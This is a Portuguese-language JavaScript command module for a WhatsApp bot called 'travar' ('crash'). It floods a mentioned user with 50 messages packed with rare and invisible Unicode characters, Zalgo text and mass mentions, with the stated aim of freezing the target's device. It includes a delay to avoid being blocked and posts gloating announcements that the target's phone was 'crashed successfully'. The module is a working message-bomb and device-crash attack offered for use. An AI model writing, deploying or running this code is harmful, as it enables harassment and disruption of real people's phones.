const { PREFIX } = require(`${BASE_DIR}/config`);
const { InvalidParameterError } = require(`${BASE_DIR}/errors`);
const { toUserJid, onlyNumbers } = require(`${BASE_DIR}/utils`);

module.exports = {
  name: "travar",
  description: "Envia caracteres raros e flood de mensagens para travar dispositivos",
  commands: ["travar", "crash", "lag", "travadispositivo", "bomb", "bombardeio"],
  usage: `${PREFIX}travar @usuario`,
  /**
   * @param {CommandHandleProps} props
   * @returns {Promise<void>}
   */
  handle: async ({
    sendText,
    sendErrorReply,
    userJid,
    replyJid,
    args,
    isReply,
    chatId,
  }) => {
    if (!args.length && !isReply) {
      throw new InvalidParameterError(
        "❗ Você precisa mencionar ou responder alguém para travar o dispositivo!"
      );
    }

    const targetJid = isReply ? replyJid : toUserJid(args[0]);

    if (!targetJid) {
      await sendErrorReply(
        "❗ Mencione um usuário ou responda uma mensagem para travar o dispositivo."
      );
      return;
    }

    const userNumber = onlyNumbers(userJid);
    const targetNumber = onlyNumbers(targetJid);

    // CARACTERES RAROS E MALICIOSOS CONHECIDOS POR TRAVAR DISPOSITIVOS
    const caracteresPerigosos = [
      "󠀀", "󠀁", "󠀂", "󠀃", "󠀄", "󠀅", "󠀆", "󠀇", "󠀈", "󠀉", // Unicode Private Use Areas
      "￾", "￼", "�", "؜", "܏", "᠎", "‌", "‍", "⁠", "﻿", // Caracteres de formatação
      "͏", "͎", "͏", "︀", "︁", "︂", "︃", "︄", "︅", "︆", // Caracteres de controle
      "️", "️", "️", "️", "️", // Variation Selectors
      "󠁧", "󠁨", "󠁩", "󠁪", "󠁫", "󠁬", "󠁭", "󠁮", "󠁯", // Tags Unicode
      "𐀀", "𐀁", "𐀂", "𐀃", "𐀄", "𐀅", "𐀆", "𐀇", "𐀈", "𐀉", // Linear B Ideograms
      "￰", "￱", "￲", "￳", "￴", "￵", "￶", "￷", "￸", "￹", // Halfwidth Forms
      "︐", "︑", "︒", "︓", "︔", "︕", "︖", "︗", "︘", "︙", // CJK Punctuation
      "𐆐", "𐆑", "𐆒", "𐆓", "𐆔", "𐆕", "𐆖", "𐆗", "𐆘", "𐆙", // Ancient Symbols
      "󠀰", "󠀱", "󠀲", "󠀳", "󠀴", "󠀵", "󠀶", "󠀷", "󠀸", "󠀹", // Tags
      "‪", "‬", "‫", "‍", "‌", "⁠", "﻿", "￼", "�", "؜", // Invisíveis e controles
      "Z͑ͫ̓ͪ̂ͫ̽͏̴̙̤̞͉͚̯̞̠͍A̴̵̜̰͔ͫ͗͢L̠ͨͧͩ͘G͎͚̑͗O̴̪̹̻̝̳", // Zalgo Text
      "̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋̋", // Combinações
      "️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍️‍", // Sequências longas
    ];

    // MENSAGEM INICIAL
    await sendText(`💣 *BOMBARDEIO INICIADO!* 💣\n@${userNumber} está travando o dispositivo de @${targetNumber}!`, [userJid, targetJid]);

    // FLOOD MASSIVO DE MENSAGENS NO PRIVADO DO ALVO
    for (let i = 0; i < 50; i++) {
      try {
        // Gerar texto com caracteres perigosos
        let textoMalicioso = `💥 BOMBA ${i+1}/50 💥\n`;
        textoMalicioso += `@${targetNumber} `.repeat(100) + "\n";
        
        // Adicionar caracteres perigosos
        for (let j = 0; j < 20; j++) {
          textoMalicioso += caracteresPerigosos[Math.floor(Math.random() * caracteresPerigosos.length)].repeat(50);
        }
        
        textoMalicioso += "\n" + "󠀀".repeat(500); // Caracteres especiais em massa
        textoMalicioso += "\n" + "￼".repeat(300); // Object Replacement Character
        textoMalicioso += "\n" + "�".repeat(400); // Replacement Character
        
        // Enviar mensagem diretamente para o alvo (simulando envio no privado)
        await sendText(textoMalicioso, [targetJid]);
        
        // Pequeno delay para não ser bloqueado muito rápido
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        console.error("Erro no envio:", error);
      }
    }

    // MENSAGEM FINAL NO GRUPO
    await sendText(`☠️ *BOMBARDEIO CONCLUÍDO!* ☠️\n@${targetNumber} teve seu dispositivo TRAVADO com sucesso!\n💀 Espero que tenha feito backup! 💀`, [userJid, targetJid]);
  },
};
